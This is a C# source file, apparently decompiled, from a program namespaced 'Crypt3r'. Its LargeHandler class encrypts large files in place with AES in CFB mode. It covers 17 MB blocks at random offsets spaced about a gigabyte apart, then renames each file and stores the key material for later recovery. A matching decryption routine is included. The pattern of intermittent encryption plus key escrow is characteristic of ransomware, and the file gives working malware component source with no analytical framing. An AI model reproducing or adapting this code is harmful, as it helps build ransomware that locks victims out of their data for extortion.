using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using Alphaleonis.Win32.Filesystem;

namespace Crypt3r;

public class LargeHandler : Handler
{
	public static readonly int MBIT_SIZE = 1048576;

	public static readonly int GBIT_SIZE = 1073741824;

	public static readonly int BLOCK_SIZE = 17825792;

	public static readonly int X_KEY_SIZE = 32;

	public LargeHandler(string rK, string oF, string eF)
		: base(rK, oF, eF)
	{
	}

	private static string GetPoints(long length)
	{
		Random random = new Random();
		string text = "0";
		for (long num = BLOCK_SIZE + 10; num <= length - GBIT_SIZE; num += GBIT_SIZE)
		{
			long num2 = random.Next(1, 200) * MBIT_SIZE + num;
			text += $"-{num2}";
			if (num >= 50 * GBIT_SIZE)
			{
				break;
			}
		}
		return text;
	}

	public override void EncryptFile()
	{
		Alphaleonis.Win32.Filesystem.FileInfo fileInfo = new Alphaleonis.Win32.Filesystem.FileInfo(base.OriPath);
		string points = GetPoints(fileInfo.Length);
		long[] array = points.Split(new char[1] { '-' }).Select(long.Parse).ToArray();
		byte[] array4;
		using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
		{
			rijndaelManaged.Mode = CipherMode.CFB;
			rijndaelManaged.Padding = PaddingMode.None;
			byte[] array2 = new byte[rijndaelManaged.KeySize / 8];
			byte[] array3 = new byte[rijndaelManaged.BlockSize / 8];
			RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
			try
			{
				rNGCryptoServiceProvider.GetBytes(array2);
				rNGCryptoServiceProvider.GetBytes(array3);
			}
			catch
			{
			}
			array4 = new byte[array2.Length + array3.Length];
			Array.Copy(array2, array4, array2.Length);
			Array.Copy(array3, 0, array4, array2.Length, array3.Length);
			using FileStream fileStream = Alphaleonis.Win32.Filesystem.File.Open(base.OriPath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
			if (!fileStream.CanWrite)
			{
				throw new Exception(base.OriPath + " cannot write :(");
			}
			using ICryptoTransform transform = rijndaelManaged.CreateEncryptor(array2, array3);
			long[] array5 = array;
			foreach (long offset in array5)
			{
				fileStream.Seek(offset, SeekOrigin.Begin);
				byte[] buffer = new byte[BLOCK_SIZE];
				fileStream.Read(buffer, 0, BLOCK_SIZE);
				using MemoryStream memoryStream = new MemoryStream(buffer);
				using (new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
				{
					fileStream.Seek(offset, SeekOrigin.Begin);
					byte[] buffer2 = memoryStream.ToArray();
					fileStream.Write(buffer2, 0, BLOCK_SIZE);
				}
			}
		}
		fileInfo.MoveTo(base.EncPath);
		KeyInfo ki = new KeyInfo
		{
			Key = array4,
			Info = points
		};
		SaveKeyInfo(ki);
	}

	public override void DecryptFile()
	{
		Handler.RsaDecrypt(Alphaleonis.Win32.Filesystem.File.ReadAllBytes(base.OriPath), base.RSAKey);
		KeyInfo keyInfo = ReadKeyInfo();
		long[] array = keyInfo.Info.Split(new char[1] { '-' }).Select(long.Parse).ToArray();
		using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
		{
			rijndaelManaged.Mode = CipherMode.CFB;
			rijndaelManaged.Padding = PaddingMode.None;
			byte[] array2 = new byte[rijndaelManaged.KeySize / 8];
			byte[] array3 = new byte[rijndaelManaged.BlockSize / 8];
			Array.Copy(keyInfo.Key, array2, array2.Length);
			Array.Copy(keyInfo.Key, array2.Length, array3, 0, array3.Length);
			using FileStream fileStream = Alphaleonis.Win32.Filesystem.File.Open(base.EncPath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
			if (!fileStream.CanWrite)
			{
				throw new Exception(base.OriPath + " cannot write :(");
			}
			using ICryptoTransform transform = rijndaelManaged.CreateDecryptor(array2, array3);
			long[] array4 = array;
			foreach (long offset in array4)
			{
				fileStream.Seek(offset, SeekOrigin.Begin);
				byte[] buffer = new byte[BLOCK_SIZE];
				fileStream.Read(buffer, 0, BLOCK_SIZE);
				using MemoryStream memoryStream = new MemoryStream(buffer);
				using (new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
				{
					fileStream.Seek(offset, SeekOrigin.Begin);
					byte[] buffer2 = memoryStream.ToArray();
					fileStream.Write(buffer2, 0, BLOCK_SIZE);
				}
			}
		}
		Alphaleonis.Win32.Filesystem.File.Delete(base.OriPath);
		new Alphaleonis.Win32.Filesystem.FileInfo(base.EncPath).MoveTo(base.OriPath);
	}

	private static byte[] XOR(byte[] cipher, byte[] key)
	{
		byte[] array = new byte[cipher.Length];
		for (int i = 0; i < cipher.Length; i++)
		{
			array[i] = (byte)(cipher[i] ^ key[i % key.Length]);
		}
		return array;
	}
}
